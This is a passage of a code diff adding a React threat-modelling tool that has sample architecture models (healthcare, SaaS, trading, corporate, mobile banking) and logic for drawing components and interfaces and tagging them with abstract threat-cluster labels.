+          { ref: 'c4', type: 'api-endpoint', name: 'Patient API', group: 'g1', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c5', type: 'auth-module', name: 'Auth Module', group: 'g1', x: 200, y: 50, owner: '@Org' },
+          { ref: 'c6', type: 'database', name: 'Patient DB (PHI)', group: 'g1', x: 30, y: 180, owner: '@Org' },
+          { ref: 'c7', type: 'file-handler', name: 'Medical Documents', group: 'g1', x: 200, y: 180, owner: '@Org' },
+          { ref: 'c8', type: 'idp', name: 'Patient IdP (Azure AD B2C)', group: 'g1', x: 100, y: 320, owner: '@CloudProvider', thirdParty: true },
+          { ref: 'c9', type: 'third-party-api', name: 'EHR API (HL7 FHIR)', group: 'g2', x: 60, y: 50, owner: '@Vendor', thirdParty: true },
+          { ref: 'c10', type: 'third-party-api', name: 'Lab Results API', group: 'g2', x: 60, y: 150, owner: '@Vendor', thirdParty: true }
+        ],
+        interfaces: [
+          { from: 'c1', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c2', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c3', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c4', to: 'c5', protocol: 'Internal Call', port: '-' },
+          { from: 'c5', to: 'c8', protocol: 'HTTPS', port: '443' },
+          { from: 'c4', to: 'c6', protocol: 'TCP', port: '5432' },
+          { from: 'c4', to: 'c7', protocol: 'Internal Call', port: '-' },
+          { from: 'c4', to: 'c9', protocol: 'HTTPS', port: '443' },
+          { from: 'c4', to: 'c10', protocol: 'HTTPS', port: '443' }
+        ]
+      },
+      { id: 'saas', name: 'Multi-Tenant SaaS Platform', icon: '☁️', desc: 'B2B SaaS with tenant isolation, SSO, CDN, async workers, and object storage.',
+        meta: { name: 'Multi-Tenant SaaS Platform', version: '1.0.0', sdlcPhase: 'Development', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'SaaS Backend', type: 'group-container', x: 310, y: 30, w: 400, h: 450, owner: '@Org' },
+          { ref: 'g2', name: 'Data Layer', type: 'group-server', x: 770, y: 30, w: 300, h: 400, owner: '@Org' },
+          { ref: 'g3', name: 'Customer Device', type: 'group-server', x: 30, y: 30, w: 220, h: 120, owner: '@Customer' }
+        ],
+        components: [
+          { ref: 'c1', type: 'client-browser', name: 'Tenant User Browser', group: 'g3', x: 30, y: 40, owner: '@Customer' },
+          { ref: 'c2', type: 'cdn', name: 'CDN (CloudFront)', x: 30, y: 200, owner: '@CloudProvider', thirdParty: true },
+          { ref: 'c3', type: 'api-endpoint', name: 'Tenant API Gateway', group: 'g1', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c4', type: 'app-logic', name: 'Tenant Isolation Logic', group: 'g1', x: 200, y: 50, owner: '@Org' },
+          { ref: 'c5', type: 'auth-module', name: 'SSO / Auth Module', group: 'g1', x: 30, y: 180, owner: '@Org' },
+          { ref: 'c6', type: 'queue-consumer', name: 'Background Worker', group: 'g1', x: 200, y: 180, owner: '@Org' },
+          { ref: 'c7', type: 'database', name: 'Tenant DB (Multi-tenant)', group: 'g2', x: 60, y: 50, owner: '@Org' },
+          { ref: 'c8', type: 'cache', name: 'Session Cache (Redis)', group: 'g2', x: 60, y: 150, owner: '@Org' },
+          { ref: 'c9', type: 'queue', name: 'Job Queue (SQS/RabbitMQ)', group: 'g2', x: 60, y: 240, owner: '@Org' },
+          { ref: 'c10', type: 'storage', name: 'Tenant File Storage (S3)', group: 'g2', x: 60, y: 320, owner: '@CloudProvider' },
+          { ref: 'c11', type: 'idp', name: 'Customer IdP (SSO)', x: 30, y: 350, owner: '@Customer', thirdParty: true }
+        ],
+        interfaces: [
+          { from: 'c1', to: 'c2', protocol: 'HTTPS', port: '443' },
+          { from: 'c1', to: 'c3', protocol: 'HTTPS', port: '443' },
+          { from: 'c3', to: 'c4', protocol: 'Internal Call', port: '-' },
+          { from: 'c3', to: 'c5', protocol: 'Internal Call', port: '-' },
+          { from: 'c4', to: 'c7', protocol: 'TCP', port: '5432' },
+          { from: 'c3', to: 'c8', protocol: 'TCP', port: '6379' },
+          { from: 'c3', to: 'c9', protocol: 'AMQP', port: '5672' },
+          { from: 'c6', to: 'c9', protocol: 'AMQP', port: '5672' },
+          { from: 'c6', to: 'c7', protocol: 'TCP', port: '5432' },
+          { from: 'c3', to: 'c10', protocol: 'HTTPS', port: '443' },
+          { from: 'c5', to: 'c11', protocol: 'HTTPS', port: '443' }
+        ]
+      },
+      { id: 'trading', name: 'Financial Trading Platform', icon: '📈', desc: 'Trading system with market data feeds, order execution, auth, and clearing/settlement.',
+        meta: { name: 'Financial Trading Platform', version: '1.0.0', sdlcPhase: 'Design', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'Trading Engine', type: 'group-server', x: 310, y: 30, w: 420, h: 450, owner: '@Org' },
+          { ref: 'g2', name: 'External Market Services', type: 'group-server', x: 790, y: 30, w: 300, h: 300, owner: '@Vendor', thirdParty: true },
+          { ref: 'g3', name: 'Trader Workstation', type: 'group-server', x: 30, y: 30, w: 220, h: 120, owner: '@User' }
+        ],
+        components: [
+          { ref: 'c1', type: 'client-browser', name: 'Trader Dashboard', group: 'g3', x: 30, y: 40, owner: '@User' },
+          { ref: 'c2', type: 'admin', name: 'Risk / Compliance Manager', x: 30, y: 220, owner: '@Org' },
+          { ref: 'c3', type: 'api-endpoint', name: 'Order API', group: 'g1', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c4', type: 'auth-module', name: 'Trader Auth (MFA/HSM)', group: 'g1', x: 220, y: 50, owner: '@Org' },
+          { ref: 'c5', type: 'app-logic', name: 'Order Matching Engine', group: 'g1', x: 30, y: 170, owner: '@Org' },
+          { ref: 'c6', type: 'queue', name: 'Order Queue', group: 'g1', x: 220, y: 170, owner: '@Org' },
+          { ref: 'c7', type: 'queue-consumer', name: 'Trade Processor', group: 'g1', x: 30, y: 290, owner: '@Org' },
+          { ref: 'c8', type: 'database', name: 'Trade Ledger DB', group: 'g1', x: 220, y: 290, owner: '@Org' },
+          { ref: 'c9', type: 'third-party-api', name: 'Market Data Feed', group: 'g2', x: 70, y: 50, owner: '@Vendor', thirdParty: true },
+          { ref: 'c10', type: 'third-party-api', name: 'Clearing / Settlement', group: 'g2', x: 70, y: 160, owner: '@Vendor', thirdParty: true }
+        ],
+        interfaces: [
+          { from: 'c1', to: 'c3', protocol: 'WebSocket', port: '443' },
+          { from: 'c2', to: 'c3', protocol: 'HTTPS', port: '443' },
+          { from: 'c3', to: 'c4', protocol: 'Internal Call', port: '-' },
+          { from: 'c3', to: 'c5', protocol: 'Internal Call', port: '-' },
+          { from: 'c5', to: 'c6', protocol: 'AMQP', port: '5672' },
+          { from: 'c7', to: 'c6', protocol: 'AMQP', port: '5672' },
+          { from: 'c7', to: 'c8', protocol: 'TCP', port: '5432' },
+          { from: 'c5', to: 'c9', protocol: 'WebSocket', port: '443' },
+          { from: 'c7', to: 'c10', protocol: 'HTTPS', port: '443' }
+        ]
+      },
+      { id: 'corporate', name: 'Corporate Network', icon: '🏢', desc: 'Enterprise network with AD, VPN, email, file server, and hybrid cloud connectivity.',
+        meta: { name: 'Corporate Network Infrastructure', version: '1.0.0', sdlcPhase: 'Operations', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'Corporate DMZ', type: 'group-server', x: 310, y: 30, w: 360, h: 280, owner: '@Org' },
+          { ref: 'g2', name: 'Internal Network', type: 'group-server', x: 730, y: 30, w: 320, h: 400, owner: '@Org' },
+          { ref: 'g3', name: 'Employee Laptop', type: 'group-server', x: 30, y: 30, w: 220, h: 120, owner: '@User' },
+          { ref: 'g4', name: 'BYOD Smartphone', type: 'group-server', x: 30, y: 170, w: 220, h: 120, owner: '@User' }
+        ],
+        components: [
+          { ref: 'c1', type: 'client-browser', name: 'Employee Browser', group: 'g3', x: 30, y: 40, owner: '@User' },
+          { ref: 'c2', type: 'client-mobile', name: 'BYOD App', group: 'g4', x: 30, y: 40, owner: '@User' },
+          { ref: 'c3', type: 'admin', name: 'IT Administrator', x: 30, y: 340, owner: '@Org' },
+          { ref: 'c4', type: 'web-server', name: 'VPN Gateway', group: 'g1', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c5', type: 'web-server', name: 'Reverse Proxy / WAF', group: 'g1', x: 200, y: 50, owner: '@Org' },
+          { ref: 'c6', type: 'web-server', name: 'Email (Exchange OWA)', group: 'g1', x: 100, y: 160, owner: '@Org' },
+          { ref: 'c7', type: 'idp', name: 'Active Directory / Entra', group: 'g2', x: 70, y: 50, owner: '@Org' },
+          { ref: 'c8', type: 'web-server', name: 'Intranet Portal', group: 'g2', x: 70, y: 150, owner: '@Org' },
+          { ref: 'c9', type: 'file-handler', name: 'File Server (SMB)', group: 'g2', x: 70, y: 240, owner: '@Org' },
+          { ref: 'c10', type: 'database', name: 'HR Database', group: 'g2', x: 70, y: 320, owner: '@Org' },
+          { ref: 'c11', type: 'third-party-api', name: 'Cloud SaaS (M365)', x: 30, y: 480, owner: '@CloudProvider', thirdParty: true }
+        ],
+        interfaces: [
+          { from: 'c1', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c2', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c3', to: 'c4', protocol: 'HTTPS', port: '443' },
+          { from: 'c4', to: 'c7', protocol: 'TCP', port: '389' },
+          { from: 'c5', to: 'c6', protocol: 'HTTPS', port: '443' },
+          { from: 'c5', to: 'c8', protocol: 'HTTPS', port: '443' },
+          { from: 'c6', to: 'c7', protocol: 'TCP', port: '389' },
+          { from: 'c8', to: 'c7', protocol: 'TCP', port: '389' },
+          { from: 'c1', to: 'c9', protocol: 'TCP', port: '445' },
+          { from: 'c7', to: 'c10', protocol: 'TCP', port: '1433' },
+          { from: 'c1', to: 'c11', protocol: 'HTTPS', port: '443' },
+          { from: 'c11', to: 'c7', protocol: 'HTTPS', port: '443' }
+        ]
+      },
+      { id: 'mobile-banking', name: 'Mobile Banking App', icon: '🏦', desc: 'Consumer banking with separate Android/iPhone, Access-App, LB/WAF, dedicated IdP, payments, and fraud detection.',
+        meta: { name: 'Mobile Banking Application', version: '1.0.0', sdlcPhase: 'Development', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'Android Phone', type: 'group-server', x: 20, y: 20, w: 250, h: 220, owner: '@User' },
+          { ref: 'g2', name: 'iPhone', type: 'group-server', x: 20, y: 260, w: 250, h: 220, owner: '@User' },
+          { ref: 'g3', name: 'Banking DMZ', type: 'group-server', x: 330, y: 20, w: 200, h: 280, owner: '@Org' },
+          { ref: 'g4', name: 'Banking Application Zone', type: 'group-server', x: 580, y: 20, w: 400, h: 500, owner: '@Org' },
+          { ref: 'g5', name: 'Identity Zone', type: 'group-server', x: 330, y: 330, w: 200, h: 200, owner: '@Org' },
+          { ref: 'g6', name: 'Payment Network', type: 'group-server', x: 1040, y: 20, w: 280, h: 350, owner: '@Vendor', thirdParty: true }
+        ],
+        components: [
+          // Android device
+          { ref: 'c1', type: 'client-mobile', name: 'Banking App (Android)', group: 'g1', x: 20, y: 40, owner: '@User' },
+          { ref: 'c2', type: 'client-mobile', name: 'Access-App (Android)', group: 'g1', x: 120, y: 40, owner: '@User' },
+          // iPhone device
+          { ref: 'c3', type: 'client-mobile', name: 'Banking App (iOS)', group: 'g2', x: 20, y: 40, owner: '@User' },
+          { ref: 'c4', type: 'client-mobile', name: 'Access-App (iOS)', group: 'g2', x: 120, y: 40, owner: '@User' },
+          // Human actor
+          { ref: 'c5', type: 'user', name: 'Bank Customer', x: 20, y: 510, owner: '@User' },
+          // DMZ — Load Balancer + WAF
+          { ref: 'c6', type: 'web-server', name: 'Load Balancer', group: 'g3', x: 30, y: 40, owner: '@Org' },
+          { ref: 'c7', type: 'web-server', name: 'WAF', group: 'g3', x: 30, y: 150, owner: '@Org' },
+          // Application Zone
+          { ref: 'c8', type: 'api-endpoint', name: 'Banking API', group: 'g4', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c9', type: 'app-logic', name: 'Transaction Engine', group: 'g4', x: 210, y: 50, owner: '@Org' },
+          { ref: 'c10', type: 'app-logic', name: 'Fraud Detection', group: 'g4', x: 30, y: 170, owner: '@Org' },
+          { ref: 'c11', type: 'database', name: 'Account DB', group: 'g4', x: 210, y: 170, owner: '@Org' },
+          { ref: 'c12', type: 'third-party-api', name: 'Push Notifications (FCM/APNs)', group: 'g4', x: 30, y: 300, owner: '@CloudProvider', thirdParty: true },
+          { ref: 'c13', type: 'third-party-api', name: 'SMS / OTP Gateway', group: 'g4', x: 210, y: 300, owner: '@Vendor', thirdParty: true },
+          // Identity Zone — strictly separated
+          { ref: 'c14', type: 'idp', name: 'Banking IdP', group: 'g5', x: 30, y: 40, owner: '@Org' },
+          { ref: 'c15', type: 'auth-module', name: 'Biometric / MFA Auth', group: 'g5', x: 30, y: 120, owner: '@Org' },
+          // Payment Network
+          { ref: 'c16', type: 'third-party-api', name: 'Card Network (Visa/MC)', group: 'g6', x: 60, y: 50, owner: '@Vendor', thirdParty: true },
+          { ref: 'c17', type: 'third-party-api', name: 'SWIFT / ACH Gateway', group: 'g6', x: 60, y: 160, owner: '@Vendor', thirdParty: true }
+        ],
+        interfaces: [
+          // Android → LB
+          { from: 'c1', to: 'c6', protocol: 'HTTPS', port: '443' },
+          { from: 'c2', to: 'c6', protocol: 'HTTPS', port: '443' },
+          // iPhone → LB
+          { from: 'c3', to: 'c6', protocol: 'HTTPS', port: '443' },
+          { from: 'c4', to: 'c6', protocol: 'HTTPS', port: '443' },
+          // DMZ chain: LB → WAF → API
+          { from: 'c6', to: 'c7', protocol: 'HTTPS', port: '443' },
+          { from: 'c7', to: 'c8', protocol: 'HTTPS', port: '443' },
+          // App zone internals
+          { from: 'c8', to: 'c9', protocol: 'Internal Call', port: '-' },
+          { from: 'c9', to: 'c10', protocol: 'Internal Call', port: '-' },
+          { from: 'c9', to: 'c11', protocol: 'TCP', port: '5432' },
+          // API → IdP zone (cross-zone, network interface)
+          { from: 'c8', to: 'c14', protocol: 'HTTPS', port: '443' },
+          { from: 'c14', to: 'c15', protocol: 'Internal Call', port: '-' },
+          // Notifications & OTP
+          { from: 'c8', to: 'c12', protocol: 'HTTPS', port: '443' },
+          { from: 'c15', to: 'c13', protocol: 'HTTPS', port: '443' },
+          // Payment interfaces
+          { from: 'c9', to: 'c16', protocol: 'HTTPS', port: '443' },
+          { from: 'c9', to: 'c17', protocol: 'HTTPS', port: '443' }
+        ]
+      }
+    ];
+
+    // ============== ICONS (SVG) ==============
+    const Icons = {
+      Target: () => <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>,
+      Settings: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>,
+      Upload: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>,
+      Download: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>,
+      Trash: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><polyline points="3,6 5,6 21,6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>,
+      Link: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>,
+      FileJson: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/></svg>,
+      Image: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21,15 16,10 5,21"/></svg>,
+      X: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>,
+      Plus: () => <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>,
+      Sun: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>,
+      Moon: () => <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>,
+    };
+
+    // ============== MAIN COMPONENT ==============
+    function TLCTCThreatIdentificationTool() {
+      const [groups, setGroups] = useState([]);
+      const [components, setComponents] = useState([]);
+      const [interfaces, setInterfaces] = useState([]);
+      const [selectedElement, setSelectedElement] = useState(null);
+      const [draggedItem, setDraggedItem] = useState(null);
+      const [connectionMode, setConnectionMode] = useState(null);
+      const [projectMeta, setProjectMeta] = useState({
+        name: 'New Threat Model',
+        version: '1.0.0',
+        author: '',
+        created: new Date().toISOString(),
+        sdlcPhase: 'Design',
+        description: ''
+      });
+      const [showSettings, setShowSettings] = useState(false);
+      const [showExport, setShowExport] = useState(false);
+      const [showThreatRegister, setShowThreatRegister] = useState(false);
+      const [filterCluster, setFilterCluster] = useState(null);
+      const [activeTab, setActiveTab] = useState('all');
+      const [pendingSuggestions, setPendingSuggestions] = useState([]);
+      const [expandedThreats, setExpandedThreats] = useState(new Set());
+      const [registerTab, setRegisterTab] = useState('threats');
+      const [darkMode, setDarkMode] = useState(() => {
+        const saved = localStorage.getItem('theme');
+        return saved ? saved === 'dark' : true; // default dark
+      });
+      const canvasRef = useRef(null);
+
+      // Sync dark mode class
+      useEffect(() => {
+        if (darkMode) {
+          document.documentElement.classList.add('dark');
+        } else {
+          document.documentElement.classList.remove('dark');
+        }
+        localStorage.setItem('theme', darkMode ? 'dark' : 'light');
+      }, [darkMode]);
+
+      // Load from localStorage
+      useEffect(() => {
+        const saved = localStorage.getItem('tlctc-threat-id-v2');
+        if (saved) {
+          try {
+            const data = JSON.parse(saved);
+            setGroups(data.groups || []);
+            setComponents(data.components || []);
+            setInterfaces((data.interfaces || []).map(i => ({
+              ...i,
+              clientComponentId: i.clientComponentId ?? null,
+              serverComponentId: i.serverComponentId ?? null,
+              roleConfidence: i.roleConfidence ?? null,
+              crossesTrustBoundary: i.crossesTrustBoundary ?? false
+            })));
+            if (data.projectMeta) setProjectMeta(data.projectMeta);
+          } catch (e) { console.error('Load failed:', e); }
+        }
+      }, []);
+
+      // Save to localStorage
+      useEffect(() => {
+        const data = { groups, components, interfaces, projectMeta: { ...projectMeta, modified: new Date().toISOString() } };
+        localStorage.setItem('tlctc-threat-id-v2', JSON.stringify(data));
+      }, [groups, components, interfaces, projectMeta]);
+
+      // Get absolute position
+      const getAbsolutePosition = (comp) => {
+        if (!comp.groupId) return { x: comp.x, y: comp.y };
+        const group = groups.find(g => g.id === comp.groupId);
+        if (!group) return { x: comp.x, y: comp.y };
+        return { x: group.x + comp.x, y: group.y + comp.y };
+      };
+
+      // Drag handlers
+      const handleDragStart = (e, item, dragType) => {
+        setDraggedItem({ ...item, dragType });
+        e.dataTransfer.effectAllowed = 'copy';
+      };
+
+      const handleCanvasDrop = (e) => {
+        e.preventDefault();
+        if (!draggedItem || !canvasRef.current) return;
+
+        const rect = canvasRef.current.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+
+        let targetGroup = null;
+        for (const group of groups) {
+          if (x >= group.x && x <= group.x + group.width && y >= group.y && y <= group.y + group.height) {
+            targetGroup = group;
+            break;
+          }
+        }
+
+        if (draggedItem.dragType === 'group') {
+          const newGroup = {
+            id: generateId(),
+            name: draggedItem.name || 'New Group',
+            type: draggedItem.id,
+            icon: draggedItem.icon,
+            x: x - 100,
+            y: y - 75,
+            width: 280,
+            height: 220,
+            metadata: { version: '', owner: '@Org', isThirdParty: false, description: '', environment: 'Production' }
+          };
+          setGroups([...groups, newGroup]);
+        } else {
+          const typeInfo = COMPONENT_TYPES.find(t => t.id === draggedItem.id);
+          // Create threats based on component type's defaultThreats
+          const defaultThreats = typeInfo?.defaultThreats || [];
+          const newComponent = {
+            id: generateId(),
+            type: draggedItem.id,
+            name: draggedItem.name,
+            icon: draggedItem.icon,
+            groupId: targetGroup?.id || null,
+            x: targetGroup ? x - targetGroup.x - 40 : x - 40,
+            y: targetGroup ? y - targetGroup.y - 25 : y - 25,
+            layer: typeInfo?.layer || 'application',
+            metadata: {
+              version: '',
+              owner: targetGroup?.metadata.owner || (typeInfo?.isThirdParty ? '@Vendor' : '@Org'),
+              isThirdParty: typeInfo?.isThirdParty || false,
+              criticality: 'Medium',
+              description: '',
+              sbom: ''
+            },
+            threats: defaultThreats.map(clusterId => ({
+              clusterId,
+              applicable: true,
+              status: 'Identified',
+              velocityClass: 'VC-2',
+              controls: [],
+              notes: '',
+              residualRisk: 'Medium',
+              controlRef: ''
+            }))
+          };
+          setComponents([...components, newComponent]);
+        }
+        setDraggedItem(null);
+      };
+
+      // Create interface — Smart Client-Server mapping (TLCTC Axiom II)
+      const createInterface = (fromId, toId) => {
+        const fromComp = components.find(c => c.id === fromId);
+        const toComp = components.find(c => c.id === toId);
+        if (!fromComp || !toComp) return;
+
+        const fromGroup = groups.find(g => g.id === fromComp.groupId);
+        const toGroup = groups.find(g => g.id === toComp.groupId);
+        const isNetworkInterface = fromComp.groupId !== toComp.groupId;
+
+        // Axiom II: Resolve client-server roles
+        const roles = resolveClientServerRoles(fromComp, toComp);
+
+        // Detect trust boundary crossing (#10 Supply Chain)
+        const crossesTrustBoundary = (
+          fromComp.metadata.owner !== toComp.metadata.owner ||
+          fromComp.metadata.isThirdParty !== toComp.metadata.isThirdParty
+        );
+
+        // Detect auth involvement (#4 Identity Theft)
+        const authTypes = ['auth-module', 'auth-library', 'idp'];
+        const involvesAuth = authTypes.includes(fromComp.type) || authTypes.includes(toComp.type);
+
+        // Build interface threats intelligently
+        const interfaceThreats = [];
+
+        if (isNetworkInterface) {
+          interfaceThreats.push({ clusterId: '#5', applicable: true, status: 'Identified', velocityClass: 'VC-4', controls: [], notes: `Network path: ${fromComp.name} ↔ ${toComp.name}`, residualRisk: 'Medium', controlRef: '' });
+        }
+
+        if (involvesAuth || isNetworkInterface) {
+          interfaceThreats.push({ clusterId: '#4', applicable: true, status: 'Identified', velocityClass: 'VC-3', controls: [], notes: `Auth flow: ${roles.client.name} (client) → ${roles.server.name} (server)`, residualRisk: 'Medium', controlRef: '' });
+        }
+
+        if (crossesTrustBoundary) {
+          interfaceThreats.push({ clusterId: '#10', applicable: true, status: 'Identified', velocityClass: 'VC-1', controls: [], notes: `Trust boundary: ${fromComp.metadata.owner} → ${toComp.metadata.owner}`, residualRisk: 'Medium', controlRef: '' });
+        }
+
+        const newInterface = {
+          id: generateId(), fromId, toId,
+          name: `${fromComp.name} → ${toComp.name}`,
+          interfaceType: isNetworkInterface ? 'network' : 'internal',
+          protocol: isNetworkInterface ? 'HTTPS' : 'Internal Call',
+          port: isNetworkInterface ? '443' : '-',
+          dataClassification: 'Internal',
+          authMethod: involvesAuth ? 'OAuth/Token' : 'None',
+          clientComponentId: roles.client.id,
+          serverComponentId: roles.server.id,
+          roleConfidence: roles.confidence,
+          crossesTrustBoundary,
+          threats: interfaceThreats,
+          sourceSphere: fromComp.metadata.owner,
+          targetSphere: toComp.metadata.owner,
+          sourceGroup: fromGroup?.name || null,
+          targetGroup: toGroup?.name || null
+        };
+
+        setInterfaces([...interfaces, newInterface]);
+
+        // Suggest adding #2 to server component and #3 to client component
+        const suggestions = [];
+        if (!(roles.server.threats || []).find(t => t.clusterId === '#2')) {
+          suggestions.push({ id: generateId(), componentId: roles.server.id, componentName: roles.server.name, clusterId: '#2', reason: `Server-side of interface (receives requests from ${roles.client.name})` });
+        }
+        if (!(roles.client.threats || []).find(t => t.clusterId === '#3')) {
+          suggestions.push({ id: generateId(), componentId: roles.client.id, componentName: roles.client.name, clusterId: '#3', reason: `Client-side of interface (processes responses from ${roles.server.name})` });
+        }
+        if (suggestions.length > 0) setPendingSuggestions(prev => [...prev, ...suggestions]);
+
+        setSelectedElement({ type: 'interface', data: newInterface });
+        setConnectionMode(null);
+      };
+
+      // Element handlers
+      const handleElementClick = (element, type) => {
+        if (connectionMode) {
+          if (type === 'component') {
+            if (connectionMode.from && connectionMode.from !== element.id) {
+              createInterface(connectionMode.from, element.id);
+            } else {
+              setConnectionMode({ from: element.id });
+            }
+          }
+        } else {
+          setSelectedElement({ type, data: element });
+        }
+      };
+
+      const handleElementDrag = (e, elementId, elementType) => {
+        if (!canvasRef.current) return;
+        const rect = canvasRef.current.getBoundingClientRect();
+        
+        if (elementType === 'group') {
+          const x = Math.max(0, e.clientX - rect.left - 140);
+          const y = Math.max(0, e.clientY - rect.top - 15);
+          setGroups(groups.map(g => g.id === elementId ? { ...g, x, y } : g));
+        } else {
+          const comp = components.find(c => c.id === elementId);
+          if (!comp) return;
+          
+          if (comp.groupId) {
+            const group = groups.find(g => g.id === comp.groupId);
+            if (group) {
+              const x = Math.max(10, Math.min(e.clientX - rect.left - group.x - 40, group.width - 90));
+              const y = Math.max(30, Math.min(e.clientY - rect.top - group.y - 25, group.height - 60));
+              setComponents(components.map(c => c.id === elementId ? { ...c, x, y } : c));
+            }
+          } else {
+            const x = Math.max(0, e.clientX - rect.left - 40);
+            const y = Math.max(0, e.clientY - rect.top - 25);
+            setComponents(components.map(c => c.id === elementId ? { ...c, x, y } : c));
+          }
+        }
+      };
+
+      const handleGroupResize = (e, groupId) => {
+        if (!canvasRef.current) return;
+        const rect = canvasRef.current.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+        
+        setGroups(groups.map(g => {
+          if (g.id !== groupId) return g;
+          return { ...g, width: Math.max(200, x - g.x), height: Math.max(150, y - g.y) };
+        }));
+      };
+
+      const deleteElement = (id, type) => {
+        if (type === 'group') {
+          setComponents(components.map(c => c.groupId === id ? { ...c, groupId: null } : c));
+          setGroups(groups.filter(g => g.id !== id));
+        } else if (type === 'component') {
+          setComponents(components.filter(c => c.id !== id));
+          setInterfaces(interfaces.filter(i => i.fromId !== id && i.toId !== id));
+        } else if (type === 'interface') {
+          setInterfaces(interfaces.filter(i => i.id !== id));
+        }
+        setSelectedElement(null);
+      };
+
+      // Threat management for interfaces
+      const updateInterfaceThreat = (interfaceId, clusterId, updates) => {
+        setInterfaces(interfaces.map(iface => {
+          if (iface.id !== interfaceId) return iface;
+          const updatedThreats = iface.threats.map(t => t.clusterId === clusterId ? { ...t, ...updates } : t);
+          return { ...iface, threats: updatedThreats };
+        }));
+        if (selectedElement?.type === 'interface' && selectedElement.data.id === interfaceId) {
+          setSelectedElement(prev => ({
+            ...prev,
+            data: {
+              ...prev.data,
+              threats: prev.data.threats.map(t => t.clusterId === clusterId ? { ...t, ...updates } : t)
+            }
+          }));
+        }
+      };
+
+      const addThreatToInterface = (interfaceId, clusterId) => {
+        setInterfaces(interfaces.map(iface => {
+          if (iface.id !== interfaceId || iface.threats.find(t => t.clusterId === clusterId)) return iface;
+          return {
+            ...iface,
